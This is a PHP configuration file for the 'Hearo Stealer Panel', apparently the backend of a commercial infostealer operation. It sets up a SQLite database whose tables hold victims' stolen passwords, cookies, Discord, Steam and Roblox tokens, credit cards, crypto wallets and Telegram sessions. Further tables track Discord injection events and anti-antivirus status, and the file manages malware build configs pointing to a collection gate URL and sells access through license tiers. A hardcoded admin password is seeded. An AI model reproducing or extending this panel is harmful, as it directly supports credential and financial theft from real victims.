<?php
// Hearo Stealer Panel — Configuration & Database
session_start();

define('XEFF_BRAND', 'Hearo');
define('XEFF_VERSION', '2.0');
define('XEFF_ROOT', dirname(__DIR__));
define('PROJECT_ROOT', dirname(dirname(__DIR__)));

$dbDir = XEFF_ROOT . '/data';
if (!is_dir($dbDir)) mkdir($dbDir, 0755, true);
$dbPath = $dbDir . '/panel.db';

try {
    $db = new PDO('sqlite:' . $dbPath);
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $db->exec('PRAGMA journal_mode=WAL');
    $db->exec('PRAGMA foreign_keys=ON');
} catch (PDOException $e) {
    die('Database connection failed.');
}

// --- Users ---
$db->exec("CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password_hash TEXT NOT NULL,
    role TEXT DEFAULT 'user',
    api_key TEXT,
    webhook_url TEXT DEFAULT '',
    telegram_bot_token TEXT DEFAULT '',
    telegram_chat_id TEXT DEFAULT '',
    auto_delete_days INTEGER DEFAULT 0,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

// --- Logs ---
$db->exec("CREATE TABLE IF NOT EXISTS logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    session_hash TEXT UNIQUE NOT NULL,
    computer_name TEXT,
    username TEXT,
    ip TEXT,
    country TEXT DEFAULT 'XX',
    os_version TEXT DEFAULT 'Windows 10/11 x64',
    passwords_count INTEGER DEFAULT 0,
    cookies_count INTEGER DEFAULT 0,
    discord_tokens INTEGER DEFAULT 0,
    credit_cards INTEGER DEFAULT 0,
    roblox_cookies INTEGER DEFAULT 0,
    minecraft_tokens INTEGER DEFAULT 0,
    steam_tokens INTEGER DEFAULT 0,
    telegram_sessions INTEGER DEFAULT 0,
    crypto_wallets INTEGER DEFAULT 0,
    vpn_configs INTEGER DEFAULT 0,
    autofills INTEGER DEFAULT 0,
    history_entries INTEGER DEFAULT 0,
    downloads INTEGER DEFAULT 0,
    web_tokens INTEGER DEFAULT 0,
    clipboard_data TEXT DEFAULT '',
    interesting_files INTEGER DEFAULT 0,
    filezilla_data INTEGER DEFAULT 0,
    mullvad_data INTEGER DEFAULT 0,
    discord_injected INTEGER DEFAULT 0,
    anti_av_status TEXT DEFAULT '',
    system_info TEXT DEFAULT '',
    browser_list TEXT DEFAULT '',
    builder_user TEXT,
    build_tag TEXT DEFAULT '',
    captured_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    last_heartbeat DATETIME DEFAULT CURRENT_TIMESTAMP,
    data_path TEXT
)");

// --- Discord Injection Events ---
$db->exec("CREATE TABLE IF NOT EXISTS discord_events (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    session_hash TEXT NOT NULL,
    event_type TEXT NOT NULL,
    event_data TEXT,
    captured_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

// --- Build Configs ---
$db->exec("CREATE TABLE IF NOT EXISTS build_configs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    build_name TEXT NOT NULL,
    format TEXT NOT NULL DEFAULT 'exe',
    gate_url TEXT NOT NULL,
    webhook_url TEXT DEFAULT '',
    features_json TEXT NOT NULL DEFAULT '{}',
    output_filename TEXT DEFAULT 'Setup.exe',
    icon_path TEXT DEFAULT '',
    jar_mod_name TEXT DEFAULT '',
    jar_mod_version TEXT DEFAULT '1.0.0',
    jar_bind_path TEXT DEFAULT '',
    compiled_path TEXT DEFAULT '',
    compiled_size INTEGER DEFAULT 0,
    sha256_hash TEXT DEFAULT '',
    download_count INTEGER DEFAULT 0,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY(user_id) REFERENCES users(id)
)");

// --- Settings ---
$db->exec("CREATE TABLE IF NOT EXISTS settings (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    setting_key TEXT,
    setting_value TEXT,
    FOREIGN KEY(user_id) REFERENCES users(id)
)");

// --- Licenses ---
$db->exec("CREATE TABLE IF NOT EXISTS licenses (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    license_key TEXT UNIQUE NOT NULL,
    tier TEXT DEFAULT 'month',
    used_by INTEGER DEFAULT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    expires_at DATETIME
)");

// Migrate: add missing columns to logs if upgrading from v1
$migrateCols = [
    'clipboard_data TEXT DEFAULT ""',
    'interesting_files INTEGER DEFAULT 0',
    'filezilla_data INTEGER DEFAULT 0',
    'mullvad_data INTEGER DEFAULT 0',
    'discord_injected INTEGER DEFAULT 0',
    'anti_av_status TEXT DEFAULT ""',
    'system_info TEXT DEFAULT ""',
    'browser_list TEXT DEFAULT ""',
    'build_tag TEXT DEFAULT ""',
    'last_heartbeat DATETIME DEFAULT CURRENT_TIMESTAMP',
];
foreach ($migrateCols as $col) {
    $colName = explode(' ', trim($col))[0];
    try { $db->exec("ALTER TABLE logs ADD COLUMN $col"); } catch (Exception $e) {}
}

// Migrate: add membership & ban columns to users
$userMigrateCols = [
    'membership_type TEXT DEFAULT "none"',
    'membership_expires DATETIME DEFAULT NULL',
    'is_banned INTEGER DEFAULT 0',
    'ban_reason TEXT DEFAULT ""',
    'banned_at DATETIME DEFAULT NULL',
    'created_by TEXT DEFAULT ""',
    'last_login DATETIME DEFAULT NULL',
    'max_builds INTEGER DEFAULT 3',
    'notes TEXT DEFAULT ""',
];
foreach ($userMigrateCols as $col) {
    try { $db->exec("ALTER TABLE users ADD COLUMN $col"); } catch (Exception $e) {}
}

// Seed admin
$stmt = $db->query("SELECT COUNT(*) FROM users");
if ($stmt->fetchColumn() == 0) {
    $hash = password_hash('xxearth1', PASSWORD_BCRYPT);
    $apiKey = bin2hex(random_bytes(16));
    $db->prepare("INSERT INTO users (username, password_hash, role, api_key) VALUES (?, ?, 'admin', ?)")
       ->execute(['real', $hash, $apiKey]);
}

// Ensure builds directory
$buildsDir = XEFF_ROOT . '/builds';
if (!is_dir($buildsDir)) mkdir($buildsDir, 0755, true);
$uploadsDir = XEFF_ROOT . '/data/uploads';
if (!is_dir($uploadsDir)) mkdir($uploadsDir, 0755, true);
$stubsDir = XEFF_ROOT . '/stubs';
if (!is_dir($stubsDir)) mkdir($stubsDir, 0755, true);

// Helpers
function sanitize($str) {
    return htmlspecialchars(trim($str ?? ''), ENT_QUOTES, 'UTF-8');
}

function generateHash() {
    return md5(uniqid(mt_rand(), true));
}

function timeAgo($datetime) {
    $now = new DateTime();
    $ago = new DateTime($datetime);
    $diff = $now->diff($ago);
    if ($diff->d > 0) return $ago->format('M d, H:i');
    if ($diff->h > 0) return $diff->h . 'h ago';
    if ($diff->i > 0) return $diff->i . 'm ago';
    return 'Just now';
}

function formatBytes($bytes, $precision = 2) {
    $units = ['B', 'KB', 'MB', 'GB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, $precision) . ' ' . $units[$pow];
}

function getGateUrl() {
    $host = $_SERVER['HTTP_HOST'] ?? 'panel.hearo.fun';
    $proto = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    if (strpos($host, 'hearo.fun') !== false) {
        return 'https://panel.hearo.fun/api.php';
    }
    return $proto . '://' . $host . '/api.php';
}
